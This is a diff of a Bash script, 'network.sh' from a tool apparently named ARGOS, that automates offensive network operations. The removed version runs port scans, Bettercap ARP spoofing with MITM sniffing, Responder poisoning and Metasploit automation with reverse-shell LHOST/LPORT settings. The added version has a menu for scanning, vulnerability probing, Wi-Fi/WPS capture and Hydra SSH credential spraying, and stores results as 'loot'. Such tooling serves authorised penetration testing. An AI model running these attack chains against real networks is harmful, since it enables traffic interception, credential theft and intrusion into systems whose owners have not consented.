@@ -1,183 +1,227 @@
-# network.sh
 #!/usr/bin/env bash
 ###############################################################################
-# Enhanced ARGOS - Network Analysis
-# Gelişmiş ağ tarama ve otomasyon betiği
+# ARGOS - Network 
+# Version: 2.1
+# Author: Z3E
 ###############################################################################
 
-source "$(dirname "$0")/../utils.sh"
+# Strict mode and error handling
+set -euo pipefail
+trap 'echo -e "${RED}[-] Error at line $LINENO${RESET}"; exit 1' ERR
 
-RED="\033[0;31m"
-GREEN="\033[0;32m"
-CYAN="\033[0;36m"
-RESET="\033[0m"
+# Configuration
+source "$(dirname "$0")/../lib/argos_lib.sh"
 
-cat << "EOF"
-  ███╗   ███╗     ███╗     ███╗    ████╗ 
- █████╗ ██████╗  ██████╗  ██████╗ ███████╗
-██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗██╔════╝
-███████║██████╔╝██║  ███╗██║   ██║███████╗
-██╔══██║██╔══██╗██║   ██║██║   ██║╚════██║
-██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
-╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
-                NETWORK ANALYSIS
-EOF
+initialize_colors
+check_root
+load_config
 
-RANGE="$1"
-if [ -z "$RANGE" ]; then
-  echo -ne "${CYAN}Enter target IP range or CIDR (e.g., 192.168.1.0/24): ${RESET}"
-  read -r RANGE
-  validate_ipcidr "$RANGE"
-fi
-[ -z "$RANGE" ] && { echo -e "${RED}[!] No range provided.${RESET}"; exit 1; }
+# Global Variables
+LOOT_DIR="./loot/network/$(date +%Y%m%d)"
+REPORTS_DIR="$LOOT_DIR/reports"
+SCANS_DIR="$LOOT_DIR/scans"
+LOGS_DIR="$LOOT_DIR/logs"
+TMP_DIR="/tmp/argos_$(date +%s)"
+export NMAPDIR="$TMP_DIR/nmap"
 
-LOOT_DIR="./loot/network"
-mkdir -p "$LOOT_DIR"
-TS=$(date +%Y%m%d_%H%M%S)
+# Initialize environment
+init_directories() {
+    create_dir "$LOOT_DIR"
+    create_dir "$REPORTS_DIR"
+    create_dir "$SCANS_DIR"
+    create_dir "$LOGS_DIR"
+    create_dir "$TMP_DIR"
+    create_dir "$NMAPDIR"
+}
 
-echo -ne "${CYAN}[?] Taramalar büyük olacak devam edilsin mi?  (y/N): ${RESET}"
-read -r CONFIRM
-[[ "$CONFIRM" =~ ^[Yy]$ ]] || exit 0
+# Main menu
+main_menu() {
+    clear
+    print_banner
+    echo -e "${CYAN}MAIN MENU${RESET}"
+    echo -e "1. Full Network Audit"
+    echo -e "2. Targeted Vulnerability Scan"
+    echo -e "3. Wireless Network Analysis"
+    echo -e "4. Post-Exploitation Activities"
+    echo -e "5. Generate Reports"
+    echo -e "6. Exit"
+}
 
-echo -e "${GREEN}[+] Starting network analysis on: $RANGE${RESET}"
-
-# Masscan Tarama
-if command -v masscan >/dev/null; then
-  echo -ne "${CYAN}[?] Masscan rate [default=10000]: ${RESET}"
-  read -r MSRATE
-  MSRATE=${MSRATE:-10000}
-  MS_OUT="$LOOT_DIR/masscan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}.txt"
-  echo -e "${CYAN}[*] Masscan scanning all ports at rate=$MSRATE ...${RESET}"
-  sudo masscan "$RANGE" -p1-65535 --rate "$MSRATE" -oL "$MS_OUT"
-fi
-
-# RustScan Tarama
-if command -v rustscan >/dev/null; then
-  RS_OUT="$LOOT_DIR/rustscan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}.txt"
-  echo -e "${CYAN}[*] RustScan scanning ...${RESET}"
-  rustscan -a "$RANGE" --ulimit 5000 -o "$RS_OUT"
-fi
-
-# Nmap Tarama
-if command -v nmap >/dev/null; then
-  SCAN="nmap_scan_$(echo "$RANGE" | sed 's|/|_|g')_${TS}"
-  echo -e "${CYAN}[*] Nmap scanning all ports ...${RESET}"
-  nmap -p- -sV -sC -O -Pn "$RANGE" -oA "$LOOT_DIR/$SCAN"
-
-  if [ -f "$MS_OUT" ]; then
-    PORTS=$(grep -oP '^\s*\d+(?=/tcp)' "$MS_OUT" | tr '\n' ',' | sed 's/,$//')
-    if [ -n "$PORTS" ]; then
-      SPEC_OUT="$LOOT_DIR/nmap_specific_$(echo "$RANGE" | sed 's|/|_|g')_${TS}"
-      echo -e "${CYAN}[*] Nmap scanning open ports: $PORTS${RESET}"
-      nmap -p"$PORTS" -sV -sC -O "$RANGE" -oA "$SPEC_OUT"
-    fi
-  fi
-fi
-
-# Bettercap
-if command -v bettercap >/dev/null; then
-  echo -ne "${CYAN}[?] Run Bettercap for MITM/ARP spoofing and analysis? (y/N): ${RESET}"
-  read -r RUN_BC
-  if [[ "$RUN_BC" =~ ^[Yy]$ ]]; then
-    echo -ne "${CYAN}[*] Enter duration for ARP spoofing in seconds [default=30]: ${RESET}"
-    read -r DURATION
-    DURATION=${DURATION:-30}
-
-    echo -e "${GREEN}[+] Initializing Bettercap...${RESET}"
-
-    # Net Recon and Probing
-    echo -e "${CYAN}[*] Starting network reconnaissance and packet analysis...${RESET}"
-    sudo bettercap -eval "
-      net.recon on;
-      net.probe on;
-      net.sniff on;
-      sleep 15;  # Capture packets for 15 seconds
-      net.sniff off;
-    " | tee "$LOOT_DIR/bettercap_recon_${TS}.log"
-
-    echo -e "${CYAN}[*] Packet analysis phase completed. Results saved to $LOOT_DIR/bettercap_recon_${TS}.log.${RESET}"
-
-    # Validate if live targets are identified
-    LIVE_TARGETS=$(grep "Found" "$LOOT_DIR/bettercap_recon_${TS}.log" | awk '{print $NF}' | tr '\n' ',')
-    if [ -z "$LIVE_TARGETS" ]; then
-      echo -e "${RED}[!] No live targets identified during reconnaissance.${RESET}"
-      exit 1
-    fi
-    echo -e "${GREEN}[+] Identified live targets: $LIVE_TARGETS${RESET}"
-
-    # ARP Spoofing and MITM
-    echo -e "${CYAN}[*] Starting ARP spoofing and MITM attack on targets: $LIVE_TARGETS for $DURATION seconds.${RESET}"
-    sudo bettercap -eval "
-      set arp.spoof.targets $LIVE_TARGETS;
-      set arp.spoof.internal true;
-      arp.spoof on;
-      net.sniff on;
-      sleep $DURATION;  # Spoof and capture packets for the user-defined duration
-      arp.spoof off;
-      net.sniff off;
-    " | tee "$LOOT_DIR/bettercap_arp_${TS}.log"
-
-    echo -e "${GREEN}[+] ARP spoofing and MITM attack completed. Results saved to $LOOT_DIR/bettercap_arp_${TS}.log.${RESET}"
-
-    # Error Analysis
-    if grep -q "error" "$LOOT_DIR/bettercap_arp_${TS}.log"; then
-      echo -e "${RED}[!] Errors detected during Bettercap execution. Check the log file for details.${RESET}"
-    else
-      echo -e "${GREEN}[+] No errors detected during Bettercap execution.${RESET}"
-    fi
-  fi
-fi
-
-# Responder
-if command -v responder >/dev/null; then
-  echo -ne "${CYAN}[?] Run Responder for SMB/NetBIOS analysis? (y/N): ${RESET}"
-  read -r RUN_RESP
-  if [[ "$RUN_RESP" =~ ^[Yy]$ ]]; then
-    RESP_LOG="$LOOT_DIR/responder_${TS}.log"
-    sudo responder -I eth0 -w -d | tee "$RESP_LOG"
-    if grep -q "Error" "$RESP_LOG"; then
-      echo -e "${RED}[!] Responder encountered errors. Check $RESP_LOG for details.${RESET}"
-    else
-      echo -e "${GREEN}[+] Responder completed successfully. Results saved to $RESP_LOG.${RESET}"
-    fi
-  fi
-fi
-
-###############################################################################
-# EKLEME BAŞLANGICI: Metasploit Entegrasyonu
-###############################################################################
-
-# Metasploit Automation
-if command -v bash >/dev/null && [ -f "$(dirname "$0")/metasploit.sh" ]; then
-  echo -e "${GREEN}[+] Starting Metasploit automation...${RESET}"
-  
-  # Nmap XML dosyasını belirleme (Tüm portlar taraması)
-  NMAP_XML="$LOOT_DIR/${SCAN}.xml"
-
-  if [ -f "$NMAP_XML" ]; then
-    # Kullanıcıdan LHOST ve LPORT bilgilerini almak (opsiyonel)
-    echo -ne "${CYAN}Enter LHOST for Metasploit (default=$(hostname -I | awk '{print $1}')): ${RESET}"
-    read -r M_LHOST
-    M_LHOST=${M_LHOST:-$(hostname -I | awk '{print $1}')}
+# Network discovery module
+network_discovery() {
+    local target="$1"
+    echo -e "${GREEN}[+] Starting Network Discovery${RESET}"
     
-    echo -ne "${CYAN}Enter LPORT for Metasploit (default=4444): ${RESET}"
-    read -r M_LPORT
-    M_LPORT=${M_LPORT:-4444}
+    # Passive discovery
+    if command -v netdiscover &>/dev/null; then
+        echo -e "${CYAN}[*] Running Netdiscover (passive)...${RESET}"
+        sudo netdiscover -p -P -r "$target" -c 10 > "$SCANS_DIR/netdiscover.txt"
+    fi
+    
+    # ARP scan
+    echo -e "${CYAN}[*] Running ARP scan...${RESET}"
+    sudo arp-scan --localnet --interface=eth0 > "$SCANS_DIR/arp_scan.txt"
+    
+    # Advanced ping sweep
+    echo -e "${CYAN}[*] Conducting ICMP discovery...${RESET}"
+    nmap -sn -PE -PP -PM -oX "$SCANS_DIR/icmp_discovery.xml" "$target"
+}
 
-    # Metasploit betiğini çalıştırma
-    bash "$(dirname "$0")/metasploit.sh" --xml "$NMAP_XML" --lhost "$M_LHOST" --lport "$M_LPORT" --loot "$LOOT_DIR"
+# Port scanning module
+port_scanning() {
+    local target="$1"
+    echo -e "${GREEN}[+] Comprehensive Port Scanning${RESET}"
+    
+    # Quick scan with RustScan
+    if command -v rustscan &>/dev/null; then
+        echo -e "${CYAN}[*] Initial Fast Scan with RustScan${RESET}"
+        rustscan -a "$target" --ulimit 7000 -g | tee "$SCANS_DIR/rustscan.txt"
+    fi
+    
+    # Full TCP scan with Nmap
+    echo -e "${CYAN}[*] Deep TCP Port Scan${RESET}"
+    nmap -sS -p- -T4 --min-rate 10000 -v -oX "$SCANS_DIR/tcp_full.xml" "$target"
+    
+    # Service detection
+    echo -e "${CYAN}[*] Service and Version Detection${RESET}"
+    nmap -sV -sC -O -A -T4 -p$(extract_ports "$SCANS_DIR/tcp_full.xml") \
+        -oX "$SCANS_DIR/service_scan.xml" "$target"
+    
+    # UDP top ports scan
+    echo -e "${CYAN}[*] UDP Port Scan${RESET}"
+    nmap -sU --top-ports 100 -T4 -oX "$SCANS_DIR/udp_scan.xml" "$target"
+}
 
-    echo -e "${GREEN}[+] Metasploit automation completed.${RESET}"
-  else
-    echo -e "${RED}[!] Nmap XML output not found at $NMAP_XML. Skipping Metasploit automation.${RESET}"
-  fi
-else
-  echo -e "${RED}[!] metasploit.sh not found or bash not available. Skipping Metasploit automation.${RESET}"
-fi
+# Vulnerability assessment module
+vulnerability_assessment() {
+    local target="$1"
+    echo -e "${GREEN}[+] Vulnerability Assessment${RESET}"
+    
+    # Nmap vulnerability scripts
+    echo -e "${CYAN}[*] Running Nmap Vuln Scripts${RESET}"
+    nmap --script "vuln and safe" -p$(extract_ports "$SCANS_DIR/tcp_full.xml") \
+        -oX "$SCANS_DIR/nmap_vuln.xml" "$target"
+    
+    # Nuclei scanning
+    if command -v nuclei &>/dev/null; then
+        echo -e "${CYAN}[*] Running Nuclei Templates${RESET}"
+        nuclei -u "http://$target" -t ~/nuclei-templates/ -severity medium,high \
+            -o "$SCANS_DIR/nuclei_scan.txt"
+    fi
+    
+    # CMS detection and scanning
+    if command -v wpscan &>/dev/null; then
+        echo -e "${CYAN}[*] WordPress Vulnerability Scan${RESET}"
+        wpscan --url "http://$target" --no-update -o "$SCANS_DIR/wpscan.txt"
+    fi
+}
 
-###############################################################################
-# EKLEME SONU
-###############################################################################
+# Wireless attack module
+wireless_attacks() {
+    echo -e "${GREEN}[+] Wireless Network Analysis${RESET}"
+    
+    if command -v airodump-ng &>/dev/null; then
+        echo -e "${CYAN}[*] Starting WiFi Monitoring${RESET}"
+        sudo airodump-ng wlan0 -w "$SCANS_DIR/wifi_capture" --output-format csv
+    fi
+    
+    if command -v reaver &>/dev/null; then
+        echo -e "${CYAN}[*] WPS PIN Attack Preparation${RESET}"
+        wash -i wlan0 -o "$SCANS_DIR/wps_targets.txt"
+    fi
+}
 
-echo -e "${GREEN}[NETWORK] Done. Results in $LOOT_DIR${RESET}"
-exit 0
+# Post-exploitation module
+post_exploitation() {
+    local target="$1"
+    echo -e "${GREEN}[+] Post-Exploitation Actions${RESET}"
+    
+    # Credential spraying
+    if command -v hydra &>/dev/null; then
+        echo -e "${CYAN}[*] SSH Credential Spraying${RESET}"
+        hydra -L "$WORDLIST_DIR/users.txt" -P "$WORDLIST_DIR/passwords.txt" \
+            ssh://"$target" -t 4 -o "$SCANS_DIR/ssh_hydra.txt"
+    fi
+    
+    # Network traffic capture
+    echo -e "${CYAN}[*] Starting Packet Capture${RESET}"
+    tshark -i eth0 -a duration:300 -w "$LOOT_DIR/network_capture.pcap" &
+}
+
+# Reporting module
+generate_reports() {
+    echo -e "${GREEN}[+] Generating Consolidated Reports${RESET}"
+    
+    # Convert XML to HTML
+    if command -v xsltproc &>/dev/null; then
+        xsltproc "$SCANS_DIR/tcp_full.xml" -o "$REPORTS_DIR/nmap_scan.html"
+    fi
+    
+    # Create executive summary
+    python3 "$LIB_DIR/report_generator.py" --input "$SCANS_DIR" --output "$REPORTS_DIR"
+}
+
+# Full Network Audit
+full_network_audit() {
+    local target="$1"
+    echo -e "${GREEN}[+] Starting Full Network Audit${RESET}"
+    
+    network_discovery "$target"
+    port_scanning "$target"
+    vulnerability_assessment "$target"
+    
+    echo -e "${GREEN}[+] Network Audit Completed${RESET}"
+}
+
+# Targeted Vulnerability Scan
+targeted_vuln_scan() {
+    local target="$1"
+    echo -e "${GREEN}[+] Starting Targeted Vulnerability Scan${RESET}"
+    
+    # Advanced vulnerability scanning with NSE
+    echo -e "${CYAN}[*] Running Advanced Vulnerability Scripts${RESET}"
+    nmap --script "vuln and safe" -p- -T4 -oX "$SCANS_DIR/targeted_vuln.xml" "$target"
+    
+    # Web vulnerability scanning
+    if command -v nikto &>/dev/null; then
+        echo -e "${CYAN}[*] Web Application Scan with Nikto${RESET}"
+        nikto -h "http://$target" -output "$SCANS_DIR/nikto_scan.html"
+    fi
+}
+
+# Get target range from config
+get_target_range() {
+    echo "$TARGET_NETWORK"
+}
+
+# Cleanup and exit
+safe_exit() {
+    echo -e "${CYAN}[*] Cleaning up temporary files${RESET}"
+    rm -rf "$TMP_DIR"
+    echo -e "${GREEN}[+] Analysis complete. Results stored in $LOOT_DIR${RESET}"
+    exit 0
+}
+
+# Main execution flow
+main() {
+    init_directories
+    local target_range=$(get_target_range)
+    
+    while true; do
+        main_menu
+        read -p "Select option: " choice
+        case $choice in
+            1) full_network_audit "$target_range" ;;
+            2) targeted_vuln_scan "$target_range" ;;
+            3) wireless_attacks ;;
+            4) post_exploitation "$target_range" ;;
+            5) generate_reports ;;
+            6) safe_exit ;;
+            *) echo -e "${RED}[!] Invalid option${RESET}";;
+        esac
+        read -p "Press Enter to continue..."
+    done
+}
+
+# Entry point
+main
